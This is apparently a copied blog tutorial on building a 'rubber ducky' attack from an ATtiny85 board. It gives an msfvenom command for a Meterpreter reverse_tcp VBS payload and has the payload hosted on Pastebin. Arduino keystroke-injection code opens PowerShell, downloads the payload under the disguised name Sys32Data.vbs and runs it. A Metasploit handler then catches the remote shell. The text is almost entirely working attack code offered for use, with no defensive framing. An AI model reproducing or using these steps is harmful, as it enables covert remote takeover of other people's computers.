https://khromozome.wordpress.com/2017/05/09/meterpreter-shell-rubber-ducky-attiny85/

# Create a payload
Use msfvenom to create a reverse_tcp payload. We should use VBS payload instead of EXE .
```
msfvenom -p windows/meterpreter/reverse_tcp   -f vbs   –smallest  LHOST=“attacker ip”  LPORT=444 -o /root/Desktop/payload.txt
```
# upload code to pastebin

Now open the file payload.txt from the desktop and copy the whole code. goto pastebin.com > click on “NEW PASTE” and paste the code, then click create paste. A new paste will be created. Note down the url somewhere, we need that in future.

# Flashing Ducky

```
#include "DigiKeyboard.h"

void setup() {
}

void loop() {
 int d=1000;
 // this is generally not necessary but with some older systems it seems to
 // prevent missing the first character after a delay:
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(d);
 DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
 DigiKeyboard.print("powershell");
 DigiKeyboard.delay(50);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client = new-object System.Net.WebClient");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(d);
 DigiKeyboard.print("$client.DownloadFile('change_to_Your_url','Sys32Data.vbs')");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.print("start Sys32Data.vbs");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
 DigiKeyboard.delay(50000);
}
```

# setup handler

```
msfconsole
msf> use multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(handler) > set LPORT 444
msf exploit(handler) > set LHOST “attacker ip”
msf exploit(handler) > exploit
msf exploit(handler) > exploit
```
